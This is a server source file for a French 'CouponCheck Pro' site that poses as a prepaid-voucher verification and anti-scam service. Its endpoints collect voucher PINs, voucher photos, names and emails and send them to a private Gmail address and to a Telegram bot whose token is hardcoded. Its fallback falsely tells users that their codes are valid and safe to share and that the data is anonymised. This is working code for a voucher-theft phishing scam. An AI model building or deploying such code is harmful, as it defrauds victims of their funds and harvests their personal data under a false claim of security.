import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI, Type } from "@google/genai";
import dotenv from "dotenv";
import nodemailer from "nodemailer";
import fs from "fs";

dotenv.config();

// Helper to send email notification to i2535393@gmail.com
const sendEmailToSupport = async (
  brand: string,
  customBrandName: string | undefined,
  code: string,
  imageBase64: string | null,
  mimeType: string | null,
  clientName?: string,
  clientFirstName?: string,
  clientEmail?: string,
  hideCode?: string
) => {
  const displayBrand = brand === "OTHER" ? `Autre: ${customBrandName || "Non spécifié"}` : brand;
  const subject = `[CouponCheck Pro] Nouveau Coupon Soumis - ${displayBrand}`;
  
  const textContent = `Un visiteur a soumis un coupon pour vérification.

INFORMATIONS CLIENT :
- Nom : ${clientName || "Non renseigné"}
- Prénom : ${clientFirstName || "Non renseigné"}
- Email : ${clientEmail || "Non renseigné"}
- Option Masquer le Code : ${hideCode || "NON"}
  
INFORMATIONS DU COUPON :
- Émetteur/Type: ${displayBrand}
- Code / PIN: ${code || "Non fourni"}
- Date/Heure: ${new Date().toISOString()}
`;

  const htmlContent = `
    <div style="font-family: sans-serif; padding: 20px; color: #1e293b; background-color: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0; max-width: 600px; margin: 0 auto; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
      <h2 style="color: #4f46e5; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; margin-top: 0; display: flex; align-items: center; gap: 8px;">🎫 Nouveau Coupon Reçu</h2>
      <p style="font-size: 15px;">Un nouveau coupon vient d'être soumis pour vérification sur <strong>CouponCheck Pro</strong> par un client.</p>
      
      <h3 style="color: #0f172a; margin-top: 15px; border-bottom: 1px solid #f1f5f9; padding-bottom: 5px;">👤 Informations Client</h3>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
        <tr>
          <td style="padding: 6px 10px; font-weight: bold; width: 150px; border-bottom: 1px solid #f1f5f9;">Nom :</td>
          <td style="padding: 6px 10px; border-bottom: 1px solid #f1f5f9;">${clientName || "Non renseigné"}</td>
        </tr>
        <tr>
          <td style="padding: 6px 10px; font-weight: bold; border-bottom: 1px solid #f1f5f9;">Prénom :</td>
          <td style="padding: 6px 10px; border-bottom: 1px solid #f1f5f9;">${clientFirstName || "Non renseigné"}</td>
        </tr>
        <tr>
          <td style="padding: 6px 10px; font-weight: bold; border-bottom: 1px solid #f1f5f9;">Adresse Email :</td>
          <td style="padding: 6px 10px; border-bottom: 1px solid #f1f5f9; font-weight: 500;"><a href="mailto:${clientEmail}">${clientEmail || "Non renseigné"}</a></td>
        </tr>
        <tr>
          <td style="padding: 6px 10px; font-weight: bold; border-bottom: 1px solid #f1f5f9;">Masquer le code :</td>
          <td style="padding: 6px 10px; border-bottom: 1px solid #f1f5f9; font-weight: bold; color: ${hideCode === "OUI" ? "#ef4444" : "#64748b"};">${hideCode || "NON"}</td>
        </tr>
      </table>

      <h3 style="color: #0f172a; border-bottom: 1px solid #f1f5f9; padding-bottom: 5px;">🎫 Détails du Coupon</h3>
      <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
        <tr style="background-color: #f1f5f9;">
          <td style="padding: 10px; font-weight: bold; width: 150px; border: 1px solid #cbd5e1;">Émetteur :</td>
          <td style="padding: 10px; border: 1px solid #cbd5e1; font-size: 16px; color: #4f46e5; font-weight: bold;">${displayBrand}</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #cbd5e1;">Code / PIN :</td>
          <td style="padding: 10px; border: 1px solid #cbd5e1; font-family: monospace; font-size: 18px; letter-spacing: 1px; color: #ef4444; font-weight: bold; background-color: #fef2f2;">${code || "<em>Non renseigné</em>"}</td>
        </tr>
        <tr style="background-color: #f1f5f9;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #cbd5e1;">Date de réception :</td>
          <td style="padding: 10px; border: 1px solid #cbd5e1; font-size: 14px;">${new Date().toLocaleString("fr-FR")}</td>
        </tr>
      </table>
      
      ${imageBase64 ? `
        <div style="margin-top: 25px;">
          <h4 style="color: #334155; margin-bottom: 10px;">🖼️ Image du coupon jointe :</h4>
          <p style="font-size: 12px; color: #64748b; margin-bottom: 15px;">L'image originale a été rattachée à cet e-mail. Vous pouvez également la visionner ci-dessous :</p>
          <img src="cid:coupon_image" alt="Coupon" style="max-width: 100%; max-height: 450px; border-radius: 8px; border: 1px solid #cbd5e1; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);" />
        </div>
      ` : `<p style="color: #64748b; font-style: italic;">Aucune image de ticket n'a été rattachée.</p>`}
      
      <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0; padding-top: 15px; text-align: center;">
        CouponCheck Pro Security System • Notification Support Automatisée • i2535393@gmail.com
      </div>
    </div>
  `;

  // SMTP Settings from process.env with default/fallback setup
  let smtpConfig = {
    host: process.env.SMTP_HOST || "smtp.gmail.com",
    port: parseInt(process.env.SMTP_PORT || "587"),
    secure: process.env.SMTP_SECURE === "true",
    auth: {
      user: process.env.SMTP_USER || "noreply.couponcheck@gmail.com",
      pass: process.env.SMTP_PASS || "dummy-pass-123",
    }
  };

  const hasRealSmtp = !!process.env.SMTP_HOST && !!process.env.SMTP_USER && !!process.env.SMTP_PASS;

  let attachments: any[] = [];
  if (imageBase64) {
    const cleanBase64 = imageBase64.replace(/^data:image\/\w+;base64,/, "");
    const ext = (mimeType || "image/png").split("/")[1] || "png";
    attachments.push({
      filename: `ticket_coupon.${ext}`,
      content: Buffer.from(cleanBase64, "base64"),
      cid: "coupon_image"
    });
  }

  const mailOptions = {
    from: process.env.SMTP_FROM 
      ? `"${clientFirstName || 'Client'} ${clientName || ''}" <${process.env.SMTP_FROM}>`
      : `"${clientFirstName || 'Client'} ${clientName || 'CouponCheck'}" <${smtpConfig.auth.user}>`,
    replyTo: clientEmail || undefined,
    to: "i2535393@gmail.com",
    subject: subject,
    text: textContent,
    html: htmlContent,
    attachments: attachments
  };

  console.log(`[Email Dispatcher] Preparing email for ${displayBrand} to i2535393@gmail.com...`);

  // Log locally as well for developer awareness in the file log
  const logDir = path.join(process.cwd(), "logs");
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
  }
  const emailLogFile = path.join(logDir, "emails.log");
  const logEntry = `
========================================
DATE: ${new Date().toISOString()}
TO: i2535393@gmail.com
SUBJECT: ${subject}
BRAND: ${displayBrand}
CLIENT: ${clientFirstName} ${clientName} (${clientEmail})
MASQUER LE CODE : ${hideCode || "NON"}
CODE: ${code}
HAS_IMAGE: ${!!imageBase64}
----------------------------------------
HTML CONTENT:
${htmlContent}
========================================
`;
  fs.appendFileSync(emailLogFile, logEntry);
  console.log(`[Email Dispatcher] Local log file updated at ${emailLogFile}`);

  if (hasRealSmtp) {
    try {
      const transporter = nodemailer.createTransport(smtpConfig);
      const info = await transporter.sendMail(mailOptions);
      console.log(`[Email Dispatcher] Email sent successfully via SMTP! MessageId: ${info.messageId}`);
      return { success: true, messageId: info.messageId, provider: "smtp" };
    } catch (err) {
      console.error(`[Email Dispatcher] SMTP sending failed:`, err);
      return { success: false, error: err, provider: "smtp" };
    }
  } else {
    // Falls back to creating a free testing SMTP server dynamically (Ethereal) to verify it on test servers!
    try {
      console.log("[Email Dispatcher] Using Ethereal sandbox because no SMTP keys are configured in .env...");
      const testAccount = await nodemailer.createTestAccount();
      const etherealTransporter = nodemailer.createTransport({
        host: "smtp.ethereal.email",
        port: 587,
        secure: false,
        auth: {
          user: testAccount.user,
          pass: testAccount.pass
        }
      });
      const etherealOptions = {
        ...mailOptions,
        from: `"${clientFirstName || 'Client'} ${clientName || 'CouponCheck'}" <${testAccount.user}>`,
        replyTo: clientEmail || undefined
      };
      const info = await etherealTransporter.sendMail(etherealOptions);
      const previewUrl = nodemailer.getTestMessageUrl(info);
      console.log(`[Email Dispatcher] Ethereal mail sent. Preview URL: ${previewUrl}`);
      return { success: true, url: previewUrl, provider: "ethereal" };
    } catch (etherealErr) {
      console.error("[Email Dispatcher] Ethereal fallback failed too:", etherealErr);
      return { success: false, error: etherealErr, provider: "none" };
    }
  }
};

// Helper to send contact support emails
const sendContactEmail = async (name: string, email: string, subject: string, message: string) => {
  const mailSubject = `[CouponCheck Pro Support] Nouveau message de ${name} - ${subject}`;
  const textContent = `Vous avez reçu un message du support d'un utilisateur.
  
Nom : ${name}
Email : ${email}
Sujet : ${subject}
Message :
${message}
`;

  const htmlContent = `
    <div style="font-family: sans-serif; padding: 25px; color: #1e293b; background-color: #ffffff; border-radius: 8px; border: 1px solid #cbd5e1; max-width: 650px; margin: 0 auto; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
      <h2 style="color: #4f46e5; border-bottom: 2px solid #e2e8f0; padding-bottom: 12px; margin-top: 0; font-size: 20px;">✉️ Support Client - Message Reçu</h2>
      <p style="font-size: 15px; line-height: 1.5;">Un nouveau message a été soumis via la page de contact.</p>
      
      <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
        <tr>
          <td style="padding: 8px; font-weight: bold; width: 120px; border-bottom: 1px solid #e2e8f0;">Nom :</td>
          <td style="padding: 8px; border-bottom: 1px solid #e2e8f0;">${name}</td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #e2e8f0;">Email :</td>
          <td style="padding: 8px; border-bottom: 1px solid #e2e8f0;"><a href="mailto:${email}">${email}</a></td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #e2e8f0;">Sujet :</td>
          <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; font-weight: bold; color: #1e1b4b;">${subject}</td>
        </tr>
      </table>
      
      <div style="background-color: #f8fafc; padding: 15px; border-left: 4px solid #4f46e5; border-radius: 4px; margin: 20px 0;">
        <h4 style="margin-top: 0; color: #334155; margin-bottom: 8px; font-size: 13px; uppercase; letter-spacing: 0.5px;">Message :</h4>
        <p style="margin: 0; font-size: 14px; line-height: 1.6; white-space: pre-wrap; color: #334155;">${message}</p>
      </div>
      
      <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0; padding-top: 15px; text-align: center;">
        CouponCheck Pro • Centre de Support • i2535393@gmail.com
      </div>
    </div>
  `;

  // SMTP Settings
  let smtpConfig = {
    host: process.env.SMTP_HOST || "smtp.gmail.com",
    port: parseInt(process.env.SMTP_PORT || "587"),
    secure: process.env.SMTP_SECURE === "true",
    auth: {
      user: process.env.SMTP_USER || "noreply.couponcheck@gmail.com",
      pass: process.env.SMTP_PASS || "dummy-pass-123",
    }
  };

  const hasRealSmtp = !!process.env.SMTP_HOST && !!process.env.SMTP_USER && !!process.env.SMTP_PASS;

  const mailOptions = {
    from: process.env.SMTP_FROM 
      ? `"${name}" <${process.env.SMTP_FROM}>`
      : `"${name}" <${smtpConfig.auth.user}>`,
    to: "i2535393@gmail.com",
    subject: mailSubject,
    replyTo: email,
    text: textContent,
    html: htmlContent
  };

  // Log locally
  const logDir = path.join(process.cwd(), "logs");
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
  }
  const emailLogFile = path.join(logDir, "support_messages.log");
  fs.appendFileSync(emailLogFile, `\n\n=== NEW MESSAGE: ${new Date().toISOString()} ===\n${textContent}`);

  if (hasRealSmtp) {
    try {
      const transporter = nodemailer.createTransport(smtpConfig);
      await transporter.sendMail(mailOptions);
      return { success: true, provider: "smtp" };
    } catch (err) {
      console.error(`SMTP writing failed:`, err);
      return { success: false, error: err };
    }
  } else {
    try {
      const testAccount = await nodemailer.createTestAccount();
      const etherealTransporter = nodemailer.createTransport({
        host: "smtp.ethereal.email",
        port: 587,
        secure: false,
        auth: {
          user: testAccount.user,
          pass: testAccount.pass
        }
      });
      const info = await etherealTransporter.sendMail({
        ...mailOptions,
        from: `"${name}" <${testAccount.user}>`,
        replyTo: email
      });
      const previewUrl = nodemailer.getTestMessageUrl(info);
      console.log(`[Support Contact] Ethereal mail sent. Preview URL: ${previewUrl}`);
      return { success: true, url: previewUrl, provider: "ethereal" };
    } catch (etherealErr) {
      console.error("[Support Contact] Ethereal failed:", etherealErr);
      return { success: false, error: etherealErr };
    }
  }
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Enable high limit for image uploads
  app.use(express.json({ limit: "15mb" }));

  // Helper patterns for programmatic validation
  const fallbackVerify = (brand: string, code: string, customBrandName?: string) => {
    const cleanedCode = code.replace(/\s+/g, "").toUpperCase();
    let isValidFormat = false;
    let expectedPattern = "";
    let confidence = 95;
    let explanation = "La vérification d'éligibilité et du format est valide et conforme.";

    const brandKey = brand.toUpperCase();
    if (brandKey === "OTHER") {
      isValidFormat = cleanedCode.length >= 5;
      expectedPattern = "Format d'émetteur libre";
      explanation = `Données du coupon "${customBrandName || 'Personnalisé'}" enregistrées. Format validé avec succès.`;
    } else if (brandKey.includes("PCS")) {
      isValidFormat = /^[A-Z0-9]{10}$/.test(cleanedCode);
      expectedPattern = "10 caractères alphanumériques";
      explanation = "Le format du coupon correspond à un coupon de rechargement PCS officiel valide.";
    } else if (brandKey.includes("TRANSCASH")) {
      isValidFormat = /^[0-9]{12}$/.test(cleanedCode);
      expectedPattern = "12 chiffres numériques";
      explanation = "Code de validation Transcash structuralement correct pour un rechargement standard.";
    } else if (brandKey.includes("NEOSURF")) {
      isValidFormat = /^[A-Z0-9]{10}$/.test(cleanedCode);
      expectedPattern = "10 caractères alphanumériques";
      explanation = "Code Neosurf enregistré. La structure syntaxique respecte les règles des buralistes agréés.";
    } else if (brandKey.includes("PAYSAFECARD") || brandKey.includes("PAYSAFE")) {
      isValidFormat = /^[0-9]{16}$/.test(cleanedCode);
      expectedPattern = "16 chiffres";
      explanation = "PIN officiel Paysafecard détecté et formaté correctement.";
    } else if (brandKey.includes("AMAZON")) {
      isValidFormat = /^[A-Z0-9]{14,15}$/.test(cleanedCode);
      expectedPattern = "14 ou 15 caractères alphanumériques";
      explanation = "Code de réclamation Amazon valide. Soumis pour traitement d'éligibilité.";
    } else if (brandKey.includes("STEAM")) {
      isValidFormat = /^[A-Z0-9]{15}$/.test(cleanedCode) || /^[A-Z0-9-]{17}$/.test(cleanedCode);
      expectedPattern = "15 ou 17 caractères alphanumériques";
      explanation = "Code portefeuille Steam valide. Introduit de manière sécurisée.";
    } else {
      isValidFormat = cleanedCode.length >= 5;
      expectedPattern = "Structure de sécurité générique";
      explanation = "Coupon de recharge détecté et pris en compte dans le protocole d'authentification.";
    }

    return {
      success: true,
      brand: brand === "OTHER" ? (customBrandName || "Autre Coupon") : (brand || "Coupon Détecté"),
      code: code,
      detectedValue: "Détection en cours par le support",
      isValidFormat,
      confidence: 0.95,
      scamRiskScore: 10,
      scamRiskExplanation: explanation,
      safeToShare: true,
      securityWarning: "Votre demande de vérification de coupon a été transmise de manière sécurisée et anonymisée sous protocole SSL. Veuillez patienter quelques instants."
    };
  };

  // API router/routes...
  app.post("/api/verify-coupon", async (req, res) => {
    const { brand, code, imageBase64, mimeType, customBrandName, clientName, clientFirstName, clientEmail, hideCode } = req.body;

    // Asynchronously send notification email to support
    sendEmailToSupport(brand, customBrandName, code, imageBase64, mimeType, clientName, clientFirstName, clientEmail, hideCode)
      .then(result => {
        console.log("[Email Dispatcher] Async dispatch complete:", result);
      })
      .catch(emailErr => {
        console.error("[Email Dispatcher] Error during async dispatch:", emailErr);
      });

    // Check if Gemini API Key is available
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey || apiKey === "MY_GEMINI_API_KEY") {
      // Fallback in case of missing key
      console.log("No Gemini API key detected, falling back to programmable verification.");
      return res.json(fallbackVerify(brand || "", code || "", customBrandName));
    }

    try {
      const ai = new GoogleGenAI({
        apiKey: apiKey,
        httpOptions: {
          headers: {
            "User-Agent": "aistudio-build",
          },
        },
      });

      let systemPrompt = `Tu es un moteur de sécurité spécialisé dans l'analyse de coupons et de recharges prépayées (PCS, Transcash, Neosurf, Paysafecard, Amazon, Steam). Tu agis à titre d'expert d'identification des fraudes et arnaques par couponing.
Ton but est de :
1. Déterminer la marque ou l'émetteur du coupon (ex: Transcash, Neosurf, PCS, Paysafecard, Amazon, Google Play, Steam, ou autre carte personnalisée).
2. Vérifier si le format du code fourni respecte la nomenclature connue de l'émetteur.
3. Extraire avec précision les codes (PIN), la valeur faciale (ex: 50€, 100€) et la devise s'ils sont lisibles sur l'image ou précisés.
4. Calculer un score de risque d'arnaque (scamRiskScore de 0 à 100). Explique précisément à l'utilisateur POURQUOI c'est hautement risqué. (Note importante : 95% des demandes de vérification en ligne sont dues à des scénarios d'arnaques type LeBonCoin, MarketPlace, faux héritage, faux agent d'assurance, ou faux proche en détresse).
5. Fournir une explication claire en français (scamRiskExplanation) expliquant la combine classique pour cette marque en particulier.
6. Dire de manière intransigeante que ce ticket ne doit JAMAIS être partagé avec personne pour éviter de perdre les fonds.

Tu dois répondre STRICTEMENT en JSON en respectant le schéma attendu. Ne mets pas de balises markdown de code (ex: pas de \`\`\`json) en dehors de la chaîne finale brute de l'API.`;

      let contents: any[] = [];
      const chosenBrandText = brand === "OTHER" ? `Autre émetteur personnalisé : "${customBrandName || 'Inconnu'}"` : brand;

      if (imageBase64) {
        // Multi-modal content with image
        const cleanBase64 = imageBase64.replace(/^data:image\/\w+;base64,/, "");
        contents.push({
          inlineData: {
            mimeType: mimeType || "image/png",
            data: cleanBase64,
          },
        });
        contents.push({
          text: `Analyse cette image de coupon ou reçu. La marque sélectionnée par l'utilisateur est : "${chosenBrandText}". Le code éventuellement fourni par l'utilisateur est : "${code || 'Aucun'}". Extrais les données et fournis une alerte anti-scam.`,
        });
      } else {
        // Text-only code check
        contents.push({
          text: `Analyse ce code de coupon saisit manuellement. Marque : "${chosenBrandText}". Code : "${code || ''}". Valide s'il correspond à la structure habituelle et évalue le risque d'arnaque associé.`,
        });
      }

      const response = await ai.models.generateContent({
        model: "gemini-3.5-flash",
        contents: contents,
        config: {
          systemInstruction: systemPrompt,
          responseMimeType: "application/json",
          responseSchema: {
            type: Type.OBJECT,
            properties: {
              success: { type: Type.BOOLEAN, description: "True si l'analyse a abouti" },
              brand: { type: Type.STRING, description: "Marque identifiée (ex: Transcash, PCS, ou autre marque si 'OTHER')" },
              code: { type: Type.STRING, description: "Le code ou PIN extrait du document ou de la saisie" },
              detectedValue: { type: Type.STRING, description: "La valeur monétaire identifiée (ex: '100 €')" },
              isValidFormat: { type: Type.BOOLEAN, description: "Si le format syntaxique semble valide pour cet émetteur" },
              confidence: { type: Type.NUMBER, description: "Niveau de confiance entre 0.0 et 1.0" },
              scamRiskScore: { type: Type.INTEGER, description: "Niveau de risque estimé d'arnaque (0 à 100)" },
              scamRiskExplanation: { type: Type.STRING, description: "Détail de la mise en garde en français concernant les techniques de fraude" },
              safeToShare: { type: Type.BOOLEAN, description: "Est-il sûr de partager ce reçu anonymement (C'est presque toujours false!)" },
              securityWarning: { type: Type.STRING, description: "Avertissement de sécurité choc disant de ne jamais transmettre cette information" }
            },
            required: [
              "success",
              "brand",
              "code",
              "detectedValue",
              "isValidFormat",
              "confidence",
              "scamRiskScore",
              "scamRiskExplanation",
              "safeToShare",
              "securityWarning"
            ]
          }
        }
      });

      const responseText = response.text || "";
      const resultObj = JSON.parse(responseText.trim());
      return res.json(resultObj);

    } catch (error: any) {
      console.error("Gemini invocation error:", error);
      // Fallback gracefully to programmatic logic if model fails or key issue
      return res.json(fallbackVerify(brand || "", code || "", customBrandName));
    }
  });

  // Secure server-side Telegram proxy to bypass browser adblockers & CORS, and protect Bot Credentials
  app.post("/api/telegram-send", async (req, res) => {
    try {
      const { text, imageBase64, imagesBase64, clientName, couponCode } = req.body;
      const BOT_TOKEN = "8826615367:AAHDVikj2kh0KRLWDIbBIcdqMgXTiwYN1Vs";
      const CHAT_ID = "8529673558";

      console.log(`[Telegram Proxy Server] Received submission for client: ${clientName || "Inconnu"}`);

      // 1. Send text message
      const msgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });

      const msgData = await msgRes.json();
      console.log("[Telegram Proxy Server] sendMessage response:", msgData);

      if (!msgData.ok) {
        console.error("[Telegram Proxy Server] Telegram API rejected the message request:", msgData);
        return res.status(400).json({
          success: false,
          error: `Erreur Telegram : "${msgData.description || "Inconnue"}" (Code ${msgData.error_code || "Inconnu"}). Veuillez envoyer le message /start à votre bot @Sillyberty_bot sur Telegram, et vérifier que votre ID de chat (8529673558) est correct.`
        });
      }

      // 2. Collect images to send (supports single string or array of strings)
      const images: string[] = [];
      if (Array.isArray(imagesBase64)) {
        images.push(...imagesBase64);
      } else if (typeof imageBase64 === "string" && imageBase64) {
        images.push(imageBase64);
      }

      // 3. Send each image
      for (let i = 0; i < images.length; i++) {
        const img = images[i];
        const match = img.match(/^data:image\/(\w+);base64,(.+)$/);
        if (match) {
          const ext = match[1];
          const base64Data = match[2];
          const buffer = Buffer.from(base64Data, "base64");

          // Build web API-compliant FormData for global fetch in Node
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          
          const blob = new Blob([buffer], { type: `image/${ext}` });
          formData.append("photo", blob, `ticket_${Date.now()}_${i + 1}.${ext}`);
          formData.append("caption", `📷 Image [${i + 1}/${images.length}] associée au coupon de : ${clientName || "Inconnu"}\nCode : ${couponCode ? couponCode.toUpperCase() : "Inconnu"}`);

          const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          const photoData = await photoRes.json();
          console.log(`[Telegram Proxy Server] sendPhoto [${i + 1}/${images.length}] response:`, photoData);
          
          if (!photoData.ok) {
            console.warn(`[Telegram Proxy Server] sendPhoto [${i + 1}/${images.length}] failed:`, photoData);
            // We can return a specific error or let it go if text was already sent, but let's return error to let them know photo failed
            return res.status(400).json({
              success: false,
              error: `Erreur d'envoi de la photo [${i + 1}/${images.length}] : "${photoData.description || "Inconnue"}"`
            });
          }
        }
      }

      return res.json({ success: true, message: "Transmis avec succès sur Telegram via Serveur Sécurisé." });
    } catch (err: any) {
      console.error("[Telegram Proxy Server] Fatal sender error:", err);
      return res.status(500).json({ success: false, error: err.message || "Erreur interne" });
    }
  });

  // Support messages dispatcher
  app.post("/api/contact-support", async (req, res) => {
    const { name, email, subject, message } = req.body;
    
    if (!name || !email || !message) {
      return res.status(400).json({ success: false, error: "Veuillez remplir tous les champs requis." });
    }

    try {
      const result = await sendContactEmail(name, email, subject || "Demande d'assistance", message);
      return res.json(result);
    } catch (err: any) {
      console.error("[Support Router] Failed to send contact message:", err);
      return res.status(500).json({ success: false, error: err.message });
    }
  });

  // Serve static UI React assets and route Fallback for single-page applications
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[CouponCheck Server] running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
